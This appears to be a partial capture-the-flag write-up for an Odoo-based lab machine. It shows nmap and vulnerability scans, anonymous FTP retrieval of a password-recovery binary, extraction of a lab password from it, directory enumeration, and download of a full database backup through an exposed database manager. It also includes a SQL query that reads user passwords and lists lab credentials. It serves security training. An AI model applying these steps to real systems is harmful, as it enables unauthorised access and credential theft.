![[Pasted image 20230507011800.png]]

Deploy the machine by pressing the green **Start Machine** button. Please allow 3-5 minutes for the VM to fully start.  
  
No brute-forcing is needed at any point in this box.  

# Recon

Key Information

- Server: Werkzeug/0.9.6 Python/2.7.9
- https://github.com/odoo/odoo
- Setup instructions: https://www.odoo.com/documentation/16.0/administration/install/install.html
- Domain: antisoft.thm 
- Employee ID: 971234596
- Username: admin@antisoft.thm
- Password: SecurePassword123!
- Odoo 10.0-20190816 (Community Edition) 
- admin_passwd = SecurePassword123!
- db_password = unkkuri-secret-pw
- db_user = odoo


```bash
┌──(root㉿kali)-[~]
└─# nmap -p- 10.10.34.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 06:55 UTC
Nmap scan report for ip-10-10-34-131.eu-west-1.compute.internal (10.10.34.131)
Host is up (0.00063s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:AA:0C:79:65:77 (Unknown)


┌──(root㉿kali)-[~]
└─# nmap -sCV -Pn 10.10.34.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 06:20 UTC
Nmap scan report for ip-10-10-34-131.eu-west-1.compute.internal (10.10.34.131)
Host is up (0.0054s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.128.178
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2915c43c181196e0a28e81678c6d5c0 (RSA)
|   256 dbf87eca5e2431f907578b8d74cbfec1 (ECDSA)
|_  256 406ec3a8fbdf15d12b9c0fc560bae0b6 (ED25519)
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
|_http-server-header: Werkzeug/0.9.6 Python/2.7.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
MAC Address: 02:AA:0C:79:65:77 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.24 seconds
```

### Vulnerability Scan

```bash
┌──(root㉿kali)-[~]
└─# nmap -sV -vv --script vuln 10.10.34.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 06:57 UTC
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:57
Completed NSE at 06:57, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 06:57
Completed NSE at 06:57, 0.00s elapsed
Initiating ARP Ping Scan at 06:57
Scanning 10.10.34.131 [1 port]
Completed ARP Ping Scan at 06:57, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:57
Completed Parallel DNS resolution of 1 host. at 06:57, 0.00s elapsed
Initiating SYN Stealth Scan at 06:57
Scanning ip-10-10-34-131.eu-west-1.compute.internal (10.10.34.131) [1000 ports]
Discovered open port 80/tcp on 10.10.34.131
Discovered open port 22/tcp on 10.10.34.131
Discovered open port 21/tcp on 10.10.34.131
Completed SYN Stealth Scan at 06:57, 0.12s elapsed (1000 total ports)
Initiating Service scan at 06:57
Scanning 3 services on ip-10-10-34-131.eu-west-1.compute.internal (10.10.34.131)
Completed Service scan at 06:57, 6.02s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.34.131.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 06:57
NSE Timing: About 98.99% done; ETC: 06:58 (0:00:00 remaining)
NSE Timing: About 98.99% done; ETC: 06:58 (0:00:01 remaining)
NSE Timing: About 98.99% done; ETC: 06:59 (0:00:01 remaining)
NSE Timing: About 98.99% done; ETC: 06:59 (0:00:01 remaining)
NSE Timing: About 98.99% done; ETC: 07:00 (0:00:02 remaining)
NSE Timing: About 98.99% done; ETC: 07:00 (0:00:02 remaining)
NSE Timing: About 98.99% done; ETC: 07:01 (0:00:02 remaining)
NSE Timing: About 98.99% done; ETC: 07:01 (0:00:02 remaining)
NSE Timing: About 98.99% done; ETC: 07:02 (0:00:03 remaining)
NSE Timing: About 98.99% done; ETC: 07:02 (0:00:03 remaining)
NSE Timing: About 98.99% done; ETC: 07:03 (0:00:03 remaining)
NSE Timing: About 98.99% done; ETC: 07:03 (0:00:04 remaining)
NSE Timing: About 98.99% done; ETC: 07:04 (0:00:04 remaining)
NSE Timing: About 98.99% done; ETC: 07:04 (0:00:04 remaining)
NSE Timing: About 98.99% done; ETC: 07:05 (0:00:05 remaining)
NSE Timing: About 98.99% done; ETC: 07:05 (0:00:05 remaining)
NSE Timing: About 99.24% done; ETC: 07:06 (0:00:04 remaining)
NSE Timing: About 99.75% done; ETC: 07:06 (0:00:01 remaining)
NSE Timing: About 99.75% done; ETC: 07:07 (0:00:01 remaining)
NSE Timing: About 99.75% done; ETC: 07:07 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:08 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:08 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:09 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:09 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:10 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:10 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:11 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:11 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:12 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:12 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:13 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:13 (0:00:02 remaining)
NSE Timing: About 99.75% done; ETC: 07:14 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:14 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:15 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:15 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:16 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:16 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:17 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:17 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:18 (0:00:03 remaining)
NSE Timing: About 99.75% done; ETC: 07:18 (0:00:03 remaining)
Completed NSE at 07:18, 1271.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:18
Completed NSE at 07:18, 1.24s elapsed
Nmap scan report for ip-10-10-34-131.eu-west-1.compute.internal (10.10.34.131)
Host is up, received arp-response (0.0073s latency).
Scanned at 2023-05-07 06:57:40 UTC for 1279s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09      *EXPLOIT*
|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT*
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19      *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97      *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT*
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F      *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138      *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330      *EXPLOIT*
|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT*
|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT*
|       EDB-ID:39569    5.5     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT*
|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0      *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283      *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF      *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF      *EXPLOIT*
|       EDB-ID:40136    4.3     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT*
|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT*
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT*
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT*
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-   *EXPLOIT*
|       CVE-2023-29323  0.0     https://vulners.com/cve/CVE-2023-29323
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.9.6 (Python 2.7.9)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| http-enum: 
|_  //system.html: CMNC-200 IP Camera
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:python:python:2.7.9: 
|       SSV:93135       10.0    https://vulners.com/seebug/SSV:93135    *EXPLOIT*
|       PACKETSTORM:143369      10.0    https://vulners.com/packetstorm/PACKETSTORM:143369      *EXPLOIT*
|       EXPLOITPACK:069C31B8DD5A351921E96252215466D8    10.0    https://vulners.com/exploitpack/EXPLOITPACK:069C31B8DD5A351921E96252215466D8      *EXPLOIT*
|       EDB-ID:42091    10.0    https://vulners.com/exploitdb/EDB-ID:42091      *EXPLOIT*
|       CVE-2016-5636   10.0    https://vulners.com/cve/CVE-2016-5636
|       1337DAY-ID-27866        10.0    https://vulners.com/zdt/1337DAY-ID-27866        *EXPLOIT*
|       SSV:92725       7.5     https://vulners.com/seebug/SSV:92725    *EXPLOIT*
|       PACKETSTORM:141350      7.5     https://vulners.com/packetstorm/PACKETSTORM:141350      *EXPLOIT*
|       CVE-2018-1000802        7.5     https://vulners.com/cve/CVE-2018-1000802
|       CVE-2017-1000158        7.5     https://vulners.com/cve/CVE-2017-1000158
|       CVE-2016-9063   7.5     https://vulners.com/cve/CVE-2016-9063
|       CVE-2016-0718   7.5     https://vulners.com/cve/CVE-2016-0718
|       1337DAY-ID-27146        7.5     https://vulners.com/zdt/1337DAY-ID-27146        *EXPLOIT*
|       CVE-2020-8492   7.1     https://vulners.com/cve/CVE-2020-8492
|       CVE-2016-4472   6.8     https://vulners.com/cve/CVE-2016-4472
|       CVE-2015-1283   6.8     https://vulners.com/cve/CVE-2015-1283
|       CVE-2019-9948   6.4     https://vulners.com/cve/CVE-2019-9948
|       EXPLOITPACK:9C529D1C084FC5AFEA7C8A0D0E5A989A    5.8     https://vulners.com/exploitpack/EXPLOITPACK:9C529D1C084FC5AFEA7C8A0D0E5A989A      *EXPLOIT*
|       EDB-ID:43500    5.8     https://vulners.com/exploitdb/EDB-ID:43500      *EXPLOIT*
|       CVE-2016-1000110        5.8     https://vulners.com/cve/CVE-2016-1000110
|       CVE-2016-0772   5.8     https://vulners.com/cve/CVE-2016-0772
|       1337DAY-ID-29438        5.8     https://vulners.com/zdt/1337DAY-ID-29438        *EXPLOIT*
|       PACKETSTORM:142756      5.0     https://vulners.com/packetstorm/PACKETSTORM:142756      *EXPLOIT*
|       CVE-2019-9636   5.0     https://vulners.com/cve/CVE-2019-9636
|       CVE-2019-5010   5.0     https://vulners.com/cve/CVE-2019-5010
|       CVE-2019-16056  5.0     https://vulners.com/cve/CVE-2019-16056
|       CVE-2019-15903  5.0     https://vulners.com/cve/CVE-2019-15903
|       CVE-2019-10160  5.0     https://vulners.com/cve/CVE-2019-10160
|       CVE-2018-20852  5.0     https://vulners.com/cve/CVE-2018-20852
|       CVE-2018-14647  5.0     https://vulners.com/cve/CVE-2018-14647
|       CVE-2018-1061   5.0     https://vulners.com/cve/CVE-2018-1061
|       CVE-2018-1060   5.0     https://vulners.com/cve/CVE-2018-1060
|       CVE-2017-9233   5.0     https://vulners.com/cve/CVE-2017-9233
|       CVE-2016-2183   5.0     https://vulners.com/cve/CVE-2016-2183
|       CVE-2013-1753   5.0     https://vulners.com/cve/CVE-2013-1753
|       0C076F95-ABB2-53E1-9E25-F7D1A5A9B3A1    5.0     https://vulners.com/githubexploit/0C076F95-ABB2-53E1-9E25-F7D1A5A9B3A1    *EXPLOIT*
|       PACKETSTORM:137651      4.3     https://vulners.com/packetstorm/PACKETSTORM:137651      *EXPLOIT*
|       CVE-2019-9947   4.3     https://vulners.com/cve/CVE-2019-9947
|       CVE-2019-9740   4.3     https://vulners.com/cve/CVE-2019-9740
|       CVE-2019-18348  4.3     https://vulners.com/cve/CVE-2019-18348
|       CVE-2019-16935  4.3     https://vulners.com/cve/CVE-2019-16935
|       CVE-2016-5699   4.3     https://vulners.com/cve/CVE-2016-5699
|       CVE-2018-1000030        3.3     https://vulners.com/cve/CVE-2018-1000030
|       CVE-2021-3426   2.7     https://vulners.com/cve/CVE-2021-3426
|_      CVE-2023-27043  0.0     https://vulners.com/cve/CVE-2023-27043
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
MAC Address: 02:AA:0C:79:65:77 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 07:18
Completed NSE at 07:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1289.17 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.040KB)

```

## FTP 21 Anonymous Allowed

```bash
┌──(root㉿kali)-[~]
└─# ftp 10.10.34.131
Connected to 10.10.34.131.
220 (vsFTPd 3.0.3)
Name (10.10.34.131:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||15773|)
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||37225|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password
226 Directory send OK.
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||49219|)
150 Opening BINARY mode data connection for notice.txt (134 bytes).
100% |********************************************|   134        1.59 KiB/s    00:00 ETA
226 Transfer complete.
134 bytes received in 00:00 (1.58 KiB/s)
ftp> get password
local: password remote: password
229 Entering Extended Passive Mode (|||52010|)
150 Opening BINARY mode data connection for password (8856 bytes).
100% |********************************************|  8856       11.61 MiB/s    00:00 ETA
226 Transfer complete.
8856 bytes received in 00:00 (7.38 MiB/s)
ftp> 
```

### notice.txt

```text
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```

- Looks like the domain is 'antisoft.thm'
- And password is a program for retrieving passwords

### password

```text
└─# file password
password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped

└─# strings password 
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-X
SecurePaH
ssword12H
AWAVA
AUATL
[]A\A]A^A_
971234596
remember this next time '%s'
Incorrect employee id
Password Recovery
Please enter your employee id that is in your email
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
<SNIP>
```

These strings are of particular interest:
- SecurePaH
- ssword12H
- AWAVA
- AUATL
- 971234596

I try to run the password file (several attempts with the strings)
```bash
┌──(root㉿kali)-[~/Downloads]
└─# chmod 700 password 

──(root㉿kali)-[~/Downloads]
└─# ./password
Password Recovery
Please enter your employee id that is in your email
971234596
remember this next time 'SecurePassword123!'

```

## SSH 22

```bash
┌──(root㉿kali)-[~]
└─# ssh root@10.10.34.131
The authenticity of host '10.10.34.131 (10.10.34.131)' can't be established.
ED25519 key fingerprint is SHA256:jAjwXDrFIfLMyP95TphtsYnFHy10snZpzCJ5o9J7K8g.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.34.131' (ED25519) to the list of known hosts.
root@10.10.34.131: Permission denied (publickey).
```
We need rsa keys to login.

## HTTP 80 

no robots.txt

### http://10.10.34.131/web/login

![[Pasted image 20230507014402.png]]


```bash
┌──(root㉿kali)-[~/Downloads]
└─# gobuster dir -u http://10.10.34.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.131
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/05/07 06:58:29 Starting gobuster in directory enumeration mode
===============================================================
/logo                 (Status: 200) [Size: 13176]
/web                  (Status: 303) [Size: 227] [--> http://10.10.34.131/web/login]
/Fran%c3%a7ais        (Status: 500) [Size: 291]
/Espa%c3%b1ol         (Status: 500) [Size: 291]
/Espa%C3%B1ol         (Status: 500) [Size: 291]
/%E9%A6%96%E9%A1%B5   (Status: 500) [Size: 291]
Progress: 44579 / 87665 (50.85%)[ERROR] 2023/05/07 07:34:08 [!] Get "http://10.10.34.131/navigate_dev": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 44923 / 87665 (51.24%)[ERROR] 2023/05/07 07:35:30 [!] Get "http://10.10.34.131/musicplay": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 45142 / 87665 (51.49%)[ERROR] 2023/05/07 07:36:24 [!] Get "http://10.10.34.131/1999-05": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 45427 / 87665 (51.82%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/05/07 07:37:29 Finished
===============================================================

┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.10.34.131/web -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.131/web
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/05/07 07:31:55 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 3141]
Progress: 370 / 87665 (0.42%)[ERROR] 2023/05/07 07:33:27 [!] Get "http://10.10.34.131/web/php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/report               (Status: 302) [Size: 327] [--> http://10.10.34.131/web/login?redirect=http%3A%2F%2F10.10.34.131%2Fweb%2Freport]
/tests                (Status: 302) [Size: 325] [--> http://10.10.34.131/web/login?redirect=http%3A%2F%2F10.10.34.131%2Fweb%2Ftests]
Progress: 1526 / 87665 (1.74%)[ERROR] 2023/05/07 07:37:46 [!] Get "http://10.10.34.131/web/ebay": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1544 / 87665 (1.76%)[ERROR] 2023/05/07 07:37:50 [!] Get "http://10.10.34.131/web/background": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4697 / 87665 (5.36%)[ERROR] 2023/05/07 07:44:01 [!] Get "http://10.10.34.131/web/1255": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 6314 / 87665 (7.20%)[ERROR] 2023/05/07 07:47:13 [!] Get "http://10.10.34.131/web/1442": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 6385 / 87665 (7.28%)[ERROR] 2023/05/07 07:47:23 [!] Get "http://10.10.34.131/web/custserv": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 7780 / 87665 (8.87%)[ERROR] 2023/05/07 07:50:01 [!] Get "http://10.10.34.131/web/investment": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 9615 / 87665 (10.97%)[ERROR] 2023/05/07 07:51:39 [!] Get "http://10.10.34.131/web/1542": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 9919 / 87665 (11.31%)[ERROR] 2023/05/07 07:52:16 [!] Get "http://10.10.34.131/web/shares": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 10872 / 87665 (12.40%)[ERROR] 2023/05/07 07:54:07 [!] Get "http://10.10.34.131/web/2124": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 11198 / 87665 (12.77%)[ERROR] 2023/05/07 07:54:47 [!] Get "http://10.10.34.131/web/ssp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)

```

https://www.odoo.com/

- /etc/openerp-server.conf
- The "master password" is named "admin_passwd" in the config file (usually, "odoo.conf".) This leads to confusion, since there is no "master" user anywhere in Odoo.  
- The "database admin" password (one for each indiviual database) is stored (Odoo 12+) inside the postgres database. It's also encrypted, so you can only clear it and reset it in the web interface.   
- The admin IS the master.
- If you are talking about the OpenERP `admin` user password, you can recover it if your database passwords aren't encrypted. (as for any other OpenERP user password)

```
  SELECT login, password FROM res_users WHERE login = 'admin';
```

## .openerp_serverrc
- Default admin master password is stored in openerp-server.conf
- but its not given forgotten one.
- Master password for openerp will found at .openerp_serverrc file.
- Which located at home directory


Trying to login was unsucessful
![[Pasted image 20230507032030.png]]

### http://10.10.34.131/web/database/manager
![[Pasted image 20230507014455.png]]

Lets try to get a backup of the main database
![[Pasted image 20230507032149.png]]

And that seemed to work
![[Pasted image 20230507032216.png]]

After a minute or so
![[Pasted image 20230507032311.png]]
This zip file contains:
- filestore (seems to be mostly resource files, images)
- dump.sql
- manifest.json

## Searching dump.sql

```bash
┌──(root㉿kali)-[~/Downloads/main_2023-05-07_08-21-52]
└─# cat dump.sql| grep 'admin_password'

┌──(root㉿kali)-[~/Downloads/main_2023-05-07_08-21-52]
└─# cat dump.sql| grep 'res_users'     
COMMENT ON TABLE public.res_company_users_rel IS 'RELATION BETWEEN res_company AND res_users';
<SNIP--NOTHING USEFUL>

┌──(root㉿kali)-[~/Downloads/main_2023-05-07_08-21-52]
└─# cat dump.sql| grep '971234596'
                                                                                                                                                                                  
┌──(root㉿kali)-[~/Downloads/main_2023-05-07_08-21-52]
└─# cat dump.sql| grep 'antisoft.thm'
